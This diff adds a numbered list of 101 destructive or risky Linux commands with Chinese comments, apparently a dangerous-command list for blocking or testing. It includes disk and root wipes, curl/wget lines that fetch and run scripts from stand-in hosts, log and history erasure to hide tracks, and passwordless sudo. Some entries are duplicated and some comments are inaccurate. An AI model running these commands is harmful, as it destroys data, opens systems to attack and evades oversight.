@@ -1,0 +1,101 @@
+[1] rm -rf /                 # 删除根目录下所有文件（极度危险）
+[2] rm -rf .                 # 删除当前目录下所有文件（容易误删）
+[3] rm -rf *                 # 删除当前目录下所有文件和子目录
+[4] dd if=/dev/zero of=/dev/sda # 清空磁盘数据，破坏性极强
+[5] mkfs.ext4 /dev/sda       # 格式化磁盘，数据永久丢失
+[6] shred -vfz /dev/sda      # 彻底擦除磁盘内容
+[7] find / -type f -delete   # 递归删除所有文件
+[8] cat /dev/null > /boot/grub/grub.cfg # 清空 GRUB 引导配置
+[9] mv /home/* /tmp          # 将用户目录移动到临时目录，可能导致用户数据丢失
+[10] cp /dev/null /etc/passwd # 清空系统用户密码文件，导致无法登录
+[11] chmod -R 777 /           # 所有文件权限开放，存在极大安全隐患
+[12] chown -R nobody:nobody / # 修改所有文件所属为 nobody，可能导致服务异常
+[13] echo "reboot" > /proc/sysrq-trigger # 强制重启系统
+[14] echo "b" > /proc/sysrq-trigger      # 立即崩溃并重启系统
+[15] kill -9 -1               # 终止所有进程，可能导致系统崩溃
+[16] pkill -u root            # 杀死所有 root 用户进程
+[17] systemctl stop sshd      # 停止 SSH 服务，远程连接中断
+[18] iptables -F              # 清空防火墙规则，暴露服务器
+[19] ip link set eth0 down    # 关闭网络接口，断开连接
+[20] echo 1 > /proc/sys/kernel/sysrq && echo t > /proc/sysrq-trigger # 输出所有线程信息，调试用途但不建议随意使用
+[21] curl http://malicious.com/shell.sh | sh # 下载并执行未知脚本
+[22] wget -O- http://evil.com/exploit.sh | bash # 同上，风险极高
+[23] mysql -e "DROP DATABASE production;" # 删除生产数据库（无确认）
+[24] redis-cli flushall       # 清空 Redis 缓存数据
+[25] truncate -s 0 /etc/shadow # 清空 shadow 文件，影响登录
+[26] passwd root -d           # 删除 root 密码，安全风险
+[27] userdel -r root          # 删除 root 用户及其目录
+[28] sudo su -c "rm -rf /home/*" nobody # 以 nobody 身份删除用户目录
+[29] find / -name "*.log" -exec rm -f {} \; # 删除所有日志文件
+[30] history -c               # 清除历史记录，掩盖操作痕迹
+[31] echo 0 > /proc/sys/kernel/printk # 屏蔽内核日志输出
+[32] sysctl -w vm.drop_caches=3 # 清空内存缓存，影响性能
+[33] mount --bind /dev/zero /dev/sda # 挂载零设备覆盖磁盘
+[34] tar cf - / | (cd /mnt/backup && tar xf -) # 全盘备份到其他位置（占用大量资源）
+[35] rsync -a / /mnt/otherdisk --delete # 同步并删除目标中不一致文件
+[36] python -c "import os; os.system('rm -rf /')" # 通过 Python 执行 shell 命令
+[37] perl -e "system('rm -rf /')" # 同上，使用 Perl
+[38] ruby -e "system 'rm -rf /'" # 使用 Ruby
+[39] find / -perm -4000 -exec rm -rf {} \; # 删除所有 SUID 文件
+[40] echo '#!/bin/bash\nrm -rf /' > /tmp/badscript.sh && chmod +x /tmp/badscript.sh && /tmp/badscript.sh # 创建并运行恶意脚本
+[41] find / -perm -4000 -exec rm -rf {} \; # 删除所有 SUID 文件，可能导致系统功能异常
+[42] echo '#!/bin/bash\nrm -rf /' > /tmp/badscript.sh && chmod +x /tmp/badscript.sh && /tmp/badscript.sh # 创建并运行恶意脚本
+[43] dd if=/dev/zero of=/dev/sda bs=1M # 清空磁盘内容，破坏性极强
+[44] mkfs.ext4 /dev/sda               # 格式化磁盘，永久丢失数据
+[45] shred -vfz /dev/sda              # 安全擦除磁盘内容
+[46] find / -type f -delete           # 递归删除所有文件
+[47] cat /dev/null > /boot/grub/grub.cfg # 清空 GRUB 引导配置，系统无法启动
+[48] mv /home/* /tmp                  # 将用户目录移动到临时目录，导致数据丢失
+[49] cp /dev/null /etc/passwd        # 清空系统密码文件，影响登录
+[50] chmod -R 777 /                   # 开放所有文件权限，存在严重安全隐患
+[51] dd if=/dev/urandom of=/dev/sda bs=1M # 随机写入磁盘破坏数据
+[52] cat /dev/random > /dev/sda          # 同上，随机数据覆盖磁盘
+[53] echo "DROP ALL" | mysql -u root     # 执行 SQL 删除所有数据库内容
+[54] rm -rf /etc/                        # 删除系统配置目录，影响服务运行
+[55] rm -rf /var/log/                    # 删除日志文件，掩盖操作痕迹
+[56] mv /bin /tmp                        # 移动系统命令目录，导致无法执行命令
+[57] cp /dev/null /etc/shadow           # 清空用户密码影子文件
+[58] truncate -s 0 /etc/group            # 清空组信息文件
+[59] find / -name "*.conf" -delete       # 删除所有配置文件
+[60] echo "" > /etc/resolv.conf         # 清空 DNS 解析配置，网络异常
+[61] kill -9 $(ps -eo pid)              # 强制杀死所有进程
+[62] pkill -u nobody                     # 杀死 nobody 用户的所有进程
+[63] systemctl stop firewalld            # 停止防火墙服务，暴露端口
+[64] iptables -t nat -F                  # 清空 NAT 表规则
+[65] ip route flush all                  # 清除路由表，断网
+[66] mount --bind /dev/null /mnt/data   # 挂载空设备覆盖已有挂载点
+[67] mkfs.ext4 /dev/mapper/root         # 格式化逻辑卷，数据丢失
+[68] shred -z /dev/sdb                   # 彻底清除磁盘内容
+[69] tar cf - /home | ssh user@remote "tar xf - -C /backup" # 将本地 home 目录传到远程并解压
+[70] rsync -a --delete / /mnt/otherdisk # 同步并删除目标差异内容
+[71] python3 -c "__import__('os').system('rm -rf /')" # Python 调用 shell 删除根目录
+[72] perl -e 'exec("rm -rf /")'          # Perl 执行危险命令
+[73] ruby -e 'exec "rm -rf /"'           # Ruby 执行危险命令
+[74] php -r "exec('rm -rf /');"          # PHP 执行 shell 删除
+[75] lua -e "os.execute('rm -rf /')"     # Lua 执行 shell 命令
+[76] find / -type f -name "*.tmp" -exec rm -f {} \; # 删除所有临时文件
+[77] find / -type f -mtime +0 -delete    # 删除一天前的文件
+[78] echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers # 开启无密码 sudo，安全隐患大
+[79] chmod 666 /etc/shadow               # 修改权限使 shadow 文件可读写
+[80] chattr +i /etc/passwd               # 锁定 passwd 文件，防止修改
+[81] rm -f /boot/vmlinuz-*               # 删除内核镜像，系统无法启动
+[82] rm -f /lib/modules/*                # 删除模块文件，系统功能缺失
+[83] echo 1 > /proc/sys/net/ipv4/ip_forward # 开启 IP 转发，可能被用于中间人攻击
+[84] sysctl -w net.ipv4.conf.all.accept_redirects=1 # 接受重定向包，存在安全风险
+[85] iptables -t mangle -F               # 清空 mangle 表规则
+[86] ethtool -K eth0 tx off              # 关闭网卡传输校验，可能导致数据损坏
+[87] modprobe -r e1000e                  # 卸载网卡驱动，断网
+[88] rmmod e1000e                       # 同上，卸载驱动
+[89] swapoff -a                          # 关闭所有交换分区
+[90] swapon --remove /dev/sda2           # 移除 swap 分区
+[91] echo 1 > /proc/sys/kernel/sysrq && echo o > /proc/sysrq-trigger # 立即关机
+[92] echo 2 > /proc/sys/kernel/sysrq && echo c > /proc/sysrq-trigger # 触发崩溃
+[93] echo 3 > /proc/sys/kernel/sysrq && echo t > /proc/sysrq-trigger # 输出线程状态
+[94] echo 4 > /proc/sys/kernel/sysrq && echo b > /proc/sysrq-trigger # 立即重启
+[95] echo 5 > /proc/sys/kernel/sysrq && echo s > /proc/sysrq-trigger # 同步所有挂载文件系统
+[96] echo 6 > /proc/sys/kernel/sysrq && echo u > /proc/sysrq-trigger # 重新挂载只读
+[97] echo 7 > /proc/sys/kernel/sysrq && echo o > /proc/sysrq-trigger # 关闭系统
+[98] echo 8 > /proc/sys/kernel/sysrq && echo t > /proc/sysrq-trigger # 输出任务列表
+[99] echo 9 > /proc/sys/kernel/sysrq && echo m > /proc/sysrq-trigger # 内存使用情况输出
+[100] echo 10 > /proc/sys/kernel/sysrq && echo l > /proc/sysrq-trigger # 显示所有 CPU 的任务
+[101] rm -rf /root/risk                 # 对本esc，该目录有特殊的用处，不允许删除！
